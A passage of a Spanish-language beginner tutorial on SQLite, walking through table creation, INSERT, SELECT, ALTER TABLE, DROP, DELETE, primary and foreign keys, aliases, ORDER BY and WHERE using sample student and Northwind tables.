&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;valor-de-campo&quot;&gt;VALOR DE CAMPO &lt;a href=&quot;#valor-de-campo&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Vendria a ser cada uno de los valores de la interseccion entre los &lt;code&gt;campos&lt;/code&gt; y los &lt;code&gt;registros&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;columnas&quot;&gt;COLUMNAS &lt;a href=&quot;#columnas&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Anteriormente realizamos la creación de una tabla, pero esta no nos serviria sin antes crear los campos o nombres de las columnas, para ello debemos crear los campos que necesitemos segun el tipo de dato que sera almacenado.&lt;/p&gt;

&lt;p&gt;Si lo hacemos de manera grafica debemos seleccionar la opcion &lt;code&gt;Add&lt;/code&gt; y en &lt;code&gt;Name&lt;/code&gt; le indicaremos el nombre que tendra nuestro campo, seguidamente en &lt;code&gt;Type&lt;/code&gt; debemos indicar el tipo de dato el cual sera almacenado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En &lt;code&gt;sqlite&lt;/code&gt; existen 5 tipos de datos que podemos usar, estos se corresponden a:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;INTEGER:&lt;/code&gt; Almacenan valores de tipos de datos enteros.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;TEXT:&lt;/code&gt; Almancenan valores de cadenas de texto.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;BLOB:&lt;/code&gt; Almacena datos binarios, como fotos, videos entre otros.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;REAL:&lt;/code&gt; Almacena numeros flotantes o valores con &lt;code&gt;,&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;NUMERIC:&lt;/code&gt; Almacena numeros que necesitan un calculo matematico preciso, no tienen limites a diferencia que real.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;En base a lo previamente mencionado crearemos 3 campos en nuestra tabla, que correspondera a el &lt;code&gt;Nombre , Apellido y la edad&lt;/code&gt;. Haciendolo de manera grafica con el gestor solo tendriamos que agregar mas campos con &lt;code&gt;add&lt;/code&gt; y si nos percatamos en la parte de abajo se nos muestra el codigo que deberiamos ejecutar si queremos ejecutar para hacer el mismo proceso mediante una &lt;code&gt;consulta&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Con esto ya tendriamos una base de datos creada con nuestra tabla &lt;code&gt;Alumnos&lt;/code&gt;, lo siguiente seria insertar registros en nuestra tabla, ya que por el momento esta se encuentra vacia.&lt;/p&gt;

&lt;h2 id=&quot;insertar-valores-en-tabla-insert-into&quot;&gt;INSERTAR VALORES EN TABLA - INSERT INTO &lt;a href=&quot;#insertar-valores-en-tabla-insert-into&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para poder insertar valores nos vamos al apartado de &lt;code&gt;Execute SQL&lt;/code&gt;. Una vez ahi para añadir valores dentro de nuestra tabla debemos hacer uso de la palabra reservada &lt;code&gt;INSERT INTO&lt;/code&gt;, y especificar el nombre de la tabla en este caso &lt;code&gt;Alumnos&lt;/code&gt; , abrimos &lt;code&gt;()&lt;/code&gt; y digitamos el nombre de los campos , seguidamente usamos la palabra &lt;code&gt;VALUES&lt;/code&gt; y de igual manera en &lt;code&gt;()&lt;/code&gt; los valores que queremos insertar.&lt;/p&gt;

&lt;p&gt;Ahora para correr nuestra &lt;code&gt;query&lt;/code&gt; solo debemos darle click a el boton &lt;code&gt;run&lt;/code&gt; o presionar la combinacion de teclas &lt;code&gt;CTRL + ENTER&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En la parte de abajo se nos mostrara un mensaje comunicandonos que la consulta se ejecuto sin errores.&lt;/p&gt;

&lt;h2 id=&quot;consultas-o-querys&quot;&gt;CONSULTAS O QUERYS &lt;a href=&quot;#consultas-o-querys&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Una consulta o query son las solicitudes o operaciones que realizamos a una base de datos. Basicamente las consultas se usan para realizar la operaciones basicas &lt;code&gt;CRUD&lt;/code&gt;, las cuales son el acronimo de:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/crud.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;instruccion-select&quot;&gt;INSTRUCCION SELECT &lt;a href=&quot;#instruccion-select&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;La consulta &lt;code&gt;SELECT&lt;/code&gt;, nos devuelve un conjunto de resultados de registros de una o varias tablas. Podemos seleccionar todos los campos haciendo uso de &lt;code&gt;*&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tambien podemos seleccionar un campo o mas especificos separandolos por comas &lt;code&gt;,&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como resultado nos arroja una tabla nueva con los registros que filtramos.&lt;/p&gt;

&lt;h2 id=&quot;modificar-tabla-alter-table&quot;&gt;MODIFICAR TABLA - ALTER TABLE &lt;a href=&quot;#modificar-tabla-alter-table&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Esta instrucción nos permite modificar la estructura existente de una tabla de nuestra base de datos, en otras palabras a que despues de haberla creado podemos hacer modificaciones en ella como cambiarle el nombre, agregar, renombrar o quitar columnas y cambiar el tipo de datos.&lt;/p&gt;

&lt;h2 id=&quot;renombrar-tabla&quot;&gt;RENOMBRAR TABLA &lt;a href=&quot;#renombrar-tabla&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Si queremos renombrar el nombre de nuestra tabla, debemos usar la instrucción &lt;code&gt;ALTER TABLE&lt;/code&gt; mas el nombre de la tabla actual y seguidamente &lt;code&gt;RENAME TO&lt;/code&gt; mas el nombre al cual deseamos cambiar.&lt;/p&gt;

&lt;p&gt;En este caso aplicaremos el proceso a nuestra tabla &lt;code&gt;Alumnos&lt;/code&gt; para renombrarla como &lt;code&gt;Estudiantes&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;y de esta manera vemos que se efectua correctamente y ahora si queremos seleccionar los datos de nuestra tabla, debemos hacerlos con el nuevo nombre que ahora corresponde a &lt;code&gt;Estudiantes&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;renombrar-columna&quot;&gt;RENOMBRAR COLUMNA &lt;a href=&quot;#renombrar-columna&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;De la misma manera que renombramos la tabla, tambien podemos hacer el proceso similar para renombrar una columna, para ello debemos ejecutar igualmente la sentencia &lt;code&gt;ALTER TABLE&lt;/code&gt; mas la tabla que contenga a la columna, despues &lt;code&gt;RENAME COLUMN&lt;/code&gt; mas el nombre actual de la columna y finalmente con &lt;code&gt;TO&lt;/code&gt; le especificamos el nombre al cual lo vamos a cambiar.&lt;/p&gt;

&lt;p&gt;Vamos a verlo de manera practica aplicandolo a la columna &lt;code&gt;edad&lt;/code&gt; de nuestra tabla &lt;code&gt;Estudiantes&lt;/code&gt; y la renombraremos como &lt;code&gt;Edades&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora volvemos a seleccionar la consulta y vemos que renombramos la columna exitosamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;agregar-columna&quot;&gt;AGREGAR COLUMNA &lt;a href=&quot;#agregar-columna&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora supongamos queremos agregar una nueva columna a nuestra tabla &lt;code&gt;Estudiantes&lt;/code&gt; que corresponda con el nombre de &lt;code&gt;Profesion&lt;/code&gt;, pues esto lo hariamos de manera similiar usando de nueva cuenta &lt;code&gt;ALTER TABLE&lt;/code&gt; mas el nombre de nuestra tabla, despues usaremos la palabra reservad &lt;code&gt;ADD&lt;/code&gt; y seguidamente el nombre que tendra nuestra columna en conjunto con su tipo de dato.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si visualizamos nuevamente nuestra tabla &lt;code&gt;Estudiantes&lt;/code&gt; observamos que ahora se añadio la columna &lt;code&gt;Profesion&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;eliminar-columna&quot;&gt;ELIMINAR COLUMNA &lt;a href=&quot;#eliminar-columna&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para pode eliminar una columna, si supongamos esta no corresponde o cometimos un error al crearla es bastante similar a la creacion de una, solo que en este caso debemos nuevamente usar la sentencia &lt;code&gt;ALTER TABLE&lt;/code&gt; con el nombre de la tabla y despues &lt;code&gt;DROP COLUMN&lt;/code&gt; mas el nombre del campo a eliminar.&lt;/p&gt;

&lt;p&gt;Vamos a aplicarlo para borrar el campo previamente creado que fue &lt;code&gt;Profesion&lt;/code&gt;, ejecutamos la consulta de manera exitosa.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si nuevamente vemos nuestra tabla &lt;code&gt;Estudiantes&lt;/code&gt;, ahora el campo &lt;code&gt;profesion&lt;/code&gt; fue eliminado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql17.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;instruccion-drop&quot;&gt;INSTRUCCION DROP &lt;a href=&quot;#instruccion-drop&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Esta sentencia probablemente solo la utilizaremos cuando estemos en la fase de construcción de nuestra base de datos, ya que en esta etapa haciendo los cambios pertinentes hasta que este lista, de otro modo si la ejecutariamos en produccion los resultados serian desastrozos y posiblemente irreparables si no contamos con una copia de seguridad.&lt;/p&gt;

&lt;h2 id=&quot;eliminar-base-de-datos-drop-database&quot;&gt;ELIMINAR BASE DE DATOS - DROP DATABASE &lt;a href=&quot;#eliminar-base-de-datos-drop-database&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para eliminar una base de datos solo debemos de ejecutar &lt;code&gt;DROP DATABASE&lt;/code&gt; y seguidamente el nombre de la base de datos, sin embargo esta instrucción no se puede ejecutar en &lt;code&gt;sqlite3&lt;/code&gt; asi que tenemos que hacerlo manualmente, pero otros gestores si permiten esta opción asi es que es bueno saberlo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql18.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;eliminar-tabla-drop-table&quot;&gt;ELIMINAR TABLA - DROP TABLE &lt;a href=&quot;#eliminar-tabla-drop-table&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para poder eliminar una tabla debemos de ejecutar la instrucción &lt;code&gt;DROP TABLE&lt;/code&gt; y seguidamente el nombre de la tabla a eliminar.&lt;/p&gt;

&lt;p&gt;Vamos a crearnos para el proceso una tabla de nombre prueba, que contenga los campos &lt;code&gt;nombre&lt;/code&gt; y &lt;code&gt;edad&lt;/code&gt; con datos cualquiera.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql19.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora en esa tabla ejecutaremos la instrucción y vemos que la tabla se elimina.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql20.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;pero aqui hay algo que quisiera agregar, cuando ejecutamos nuevamente el comando este nos devuelve un error en vista que ya no existe la tabla.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql21.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para poder solucionar eso cuando se realize una creación de tabla o eliminación usar la palabra reservada &lt;code&gt;IF EXISTS&lt;/code&gt; y  de esa manera comprueba la existencia de la tabla antes de borrarla y en consecuencia evitamos los errores.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql22.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;identificadores&quot;&gt;IDENTIFICADORES &lt;a href=&quot;#identificadores&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Cuando estamos insertando registros, debemos de poder usar un metodo que nos permita diferenciar los registros de tal modo que cada uno de estos sea unico. Aqui es donde comenzamos a usar los &lt;code&gt;identificadores&lt;/code&gt; los cuales son de dos tipos: &lt;code&gt;claves primarias y claves foraneas&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;claves-primarias-o-primary-keys&quot;&gt;CLAVES PRIMARIAS - PRIMARY KEYS &lt;a href=&quot;#claves-primarias-o-primary-keys&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Cada tabla debe de tener su identificador unico, que no se puede repetir para poder diferencias los registros, esto se conoce como &lt;code&gt;clave primary&lt;/code&gt;, la cual no puede ser nula y es autoincrementable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si queremos definir una clave primaria en nuestra tabla anteriormente creada, primero tendriamos que eliminar todos los registros, de otro modo no podremos hacerlo. Por ello siempre al momento de crear una tabla es necesario definir nuestra &lt;code&gt;clave primaria&lt;/code&gt; y evitar problemas.&lt;/p&gt;

&lt;p&gt;En nuestro caso vamos a eliminar los registros para seguir trabajando con muestra tabla &lt;code&gt;Àlumnos&lt;/code&gt; y esto lo hacemos con otra consulta la cual es &lt;code&gt;DELETE&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;identificadores&quot;&gt;INSTRUCCION DELETE &lt;a href=&quot;#identificadores&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para borrar los registros debemos usar la palabra reservada &lt;code&gt;DELETE FROM&lt;/code&gt; y a continuación el nombre de la tabla.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si queremos hacerlo de manera grafica, nos vamos a la opción &lt;code&gt;Database Structure&lt;/code&gt;, buscamos la tabla y le damos en modificar.&lt;/p&gt;

&lt;p&gt;Se nos volvera a abrir nuevamente la misma pestaña de cuando creamos la tabla, pero ahora modificaremos los valores y añadiremos un campo &lt;code&gt;id_alumno&lt;/code&gt; y seleccionaremos las opciones de &lt;code&gt;PK&lt;/code&gt; clave primary - auto-incrementable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tambien podriamos hacerlo desde el apartado de &lt;code&gt;Execute Sql&lt;/code&gt; insertando la siguiente consulta que nos marca el propio gestor.&lt;/p&gt;

&lt;p&gt;Una vez modificada la tabla, probamos a insertar nuevamente varios registros con &lt;code&gt;INSERT INTO&lt;/code&gt; que lo vimos previamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;No es necesario que especifiquemos el campo &lt;code&gt;id_alumno&lt;/code&gt;, puesto que es &lt;code&gt;auto-incrementable&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Debemos tener en cuenta que si ejecutamos varias consultas, entonces tenemos que separarlas con &lt;code&gt;;&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Ahora verificamos los registros insetados haciendo uso del &lt;code&gt;SELECT&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si vemos esta vez el &lt;code&gt;id_alumno&lt;/code&gt; nos muestra el numero de identificador distinto el cual hace que los registros que ahora tenemos sean unicos.&lt;/p&gt;

&lt;h2 id=&quot;claves-foraneas-o-foreign-keys&quot;&gt;CLAVES FORANEAS - FOREIGN KEYS &lt;a href=&quot;#claves-foraneas-o-foreign-keys&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para entender lo que es una clave foranea, primero vammos a crear una neuva tabla y la llamaremos &lt;code&gt;turno_clase&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Como ya vimos anteriormente cada tabla tiene su clave primaria, pero esta vez vemos que en la tabla &lt;code&gt;turno_clase&lt;/code&gt; existe un campo &lt;code&gt;id_alumno&lt;/code&gt; que no esta haciendo referencia a una clave primaria ya que esta se repite. Entonces te preguntaras a que hace referencia entonces ese campo?&lt;/p&gt;

&lt;p&gt;Pues ese campo se llama &lt;code&gt;clave foranea&lt;/code&gt; ya que se utiliza para hacer referencia a una &lt;code&gt;clave primaria&lt;/code&gt; de otra tabla, en este caso a la clave de la tabla &lt;code&gt;alumnos&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ya que la tabla &lt;code&gt;turno_clase&lt;/code&gt; necesita hacer referencia a los &lt;code&gt;alumnos&lt;/code&gt; mediante el valor unico que tienen correspondiente al &lt;code&gt;id_alumno&lt;/code&gt; y con ese identificador podemos tener acceso a toda la información de los alumnos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En este punto para poder continuar aprendiendo todas los tipos de consultas que nos falta es necesario que tengamos una &lt;code&gt;Base de Datos&lt;/code&gt; de mayor escala y asi entender todo de manera mas clara, para ello vamos a descargarnos una de las tipicas bases de datos que se usan a la hora de aprender &lt;code&gt;Sql&lt;/code&gt;. En este caso vamos a utilizar la base de datos de &lt;code&gt;Northwind.db&lt;/code&gt; del siguiente enlace:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://en.wikiversity.org/wiki/Database_Examples/Northwind/SQLite&quot;&gt;https://en.wikiversity.org/wiki/Database_Examples/Northwind/SQLite&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Una vez vayamos a este enlace lo unico que tenemos que hacer es copiar toda la consulta entera y pegarla en el apartado de &lt;code&gt;Execute SQL&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora nos dirigimos al apartado de &lt;code&gt;Database Structure&lt;/code&gt; podemos visualizar la DB &lt;code&gt;Northwind.db&lt;/code&gt;, y ahora estamos listos para continuar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;clausula-as-o-alias&quot;&gt;CLAUSULA AS O ALIAS &lt;a href=&quot;#clausula-as-o-alias&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Anteriormente vimos que podiamos seleccionar registro de las tablas usando &lt;code&gt;SELECT&lt;/code&gt;, en este caso al ahora trabajar con &lt;code&gt;northwind&lt;/code&gt; podemos probar a seleccionar alguna de las tablas como &lt;code&gt;Customers&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero hay ocasiones como esta en las que nos resulte tedioso trabajar con tablas las cuales no creamos previamente nosotros y para poder entenderlas mejor queramos cambiar el nombre de los campos de estas por algo mas descriptivo para nostros, es posible esto?.&lt;/p&gt;

&lt;p&gt;Pues la respuesta es si y eso lo hacemos con la palabra reservada &lt;code&gt;AS&lt;/code&gt; despues de seleccionar los campos deseados y especificamos el nombre al que queremos renombrar para que se muestren en los registros, no debemos olvidar que con &lt;code&gt;FROM&lt;/code&gt; especificamos de que tabla queremos hacer la consulta.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podriamos usar el mismo concepto para en la tabla &lt;code&gt;Products&lt;/code&gt;, supongamos que en nuestra empresa un dia especifico se dan los productos a mitad de precio, nosotros podriamos mostrar el precio normal y tambien otro campo donde nos muestre el precio a la mitad. Ya que al &lt;code&gt;precio&lt;/code&gt; ser un valor numerico podemos hacer operaciones como multiplicarlo, dividirlo y entre otras operaciones matematicas comunes como a continuación.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;clausula-order-by&quot;&gt;CLAUSULA ORDER BY &lt;a href=&quot;#clausula-order-by&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Imaginemos una situación en la que tenemos una tabla, en este caso especifico la tabla &lt;code&gt;Products&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora en la empresa en la que trabajamos, nos piden ordenar la tabla pero no queremos que se ordene por defecto con el &lt;code&gt;product_id&lt;/code&gt;, mas bien queremos ordenarlo por el &lt;code&gt;precio&lt;/code&gt;.Pues en este caso utilizariamos &lt;code&gt;ORDER BY&lt;/code&gt; y seguidamente el campo por el cual queremos ordenarla.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De este modo lo que haria la consulta seria ordenar la tabla en base a la columna de los &lt;code&gt;Precios&lt;/code&gt;, pero vemos que nos los ordenar de menor a mayor y nosotros queremos que se ordenen los precios de mayor a menor ya que nos importan los prodcutos que cuestan mas.&lt;/p&gt;

&lt;p&gt;Pues en ese caso usuariamos &lt;code&gt;DESC&lt;/code&gt; al final para poder ordenarlo en modo &lt;code&gt;DESCENDENTE&lt;/code&gt; y de igual forma podriamos usar tambien &lt;code&gt;ASC&lt;/code&gt; que nos lo ordenaria de manera &lt;code&gt;ASCENDENTE&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Entonces te preguntaras genial, me ordenar segun el precio ya que es un valor numerico, pero que pasa si en vez de ese campo, lo ordeno por &lt;code&gt;ProductName&lt;/code&gt;?. En ese caso tambien nos lo va ordenar pero al ser tipo de dato &lt;code&gt;TEXT&lt;/code&gt; lo hara alfabeticamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;clausula-where&quot;&gt;CLAUSULA WHERE &lt;a href=&quot;#clausula-where&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;En &lt;code&gt;SQL&lt;/code&gt; la capacidad de usar condicionales es muy importante ya que estas nos permiten encontrar consultas muy especificas. De igual forma que en los demas lenguajes de programación, podemos ejecutar una sentencia en la medida en que la condición se cumpla.&lt;/p&gt;

&lt;p&gt;Una de las formas de hacer esto en &lt;code&gt;sql&lt;/code&gt; es con el uso de la clausula &lt;code&gt;WHERE&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Si ahora seleccionamos algun campo de una tabla de nuestra base de datos como en este caso de &lt;code&gt;Products&lt;/code&gt;, la consulta nos devuelve todos los registros de los campos seleccioandos&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero supongamos nosotros solo queremos mostrar uno de ellos, concretamente lo correspondiente al producto &lt;code&gt;Tofu&lt;/code&gt;. Pues aqui utilizarimos la clausula &lt;code&gt;WHERE&lt;/code&gt; y seguida la condición en este caso queremos que el &lt;code&gt;ProductName&lt;/code&gt; sea igual a &lt;code&gt;Tofu&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query17.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Entonces la consulta nos devolveria los campos, donde solamente el &lt;code&gt;ProductName = Tofu&lt;/code&gt;, y de cumplirse la condicion al ser &lt;code&gt;TRUE&lt;/code&gt; nos los devuelve, de lo contrario si no existiera nos devolveria &lt;code&gt;FALSE&lt;/code&gt; y no se nos mostraria.&lt;/p&gt;

&lt;p&gt;Ahora vamos a hacer algo un poquito mas complejo, supongamos que queremos obtener los productos solo si los precios son mayores a &lt;code&gt;50&lt;/code&gt;. En este caso usariamos los operadores de comparación en nuestra codición donde &lt;code&gt;Price &amp;gt; 50&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query18.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tambien podriamos usar el &lt;code&gt;WHERE&lt;/code&gt;cuando queremos eliminar registros, en este caso vemos que en la tabla &lt;code&gt;Products&lt;/code&gt;, existe un producto donde el &lt;code&gt;Precio = 0&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query19.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Entonces para eliminarlo usriamos la siguiente consulta usando &lt;code&gt;DELETE&lt;/code&gt;  y con &lt;code&gt;WHERE&lt;/code&gt;, especificariamos la condición de modo tal que se elimine el registro solo si el precio es 0.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query20.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora volvemos a ejecutar la consulta vemos que efectivamente el registro se elimino.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query21.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;instruccion-update&quot;&gt;INSTRUCCION UPDATE &lt;a href=&quot;#instruccion-update&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;La instrucción &lt;code&gt;UPDATE&lt;/code&gt; se utiliza para modificar los datos existentes de una o varias filas.&lt;/p&gt;

&lt;p&gt;Usaremos nuestra tabla &lt;code&gt;Estudiantes&lt;/code&gt; para modificar la edad de nuestro registro donde el nombre es &lt;code&gt;Juan&lt;/code&gt; y asignarle el valor de &lt;code&gt;30&lt;/code&gt;.&lt;/p&gt;

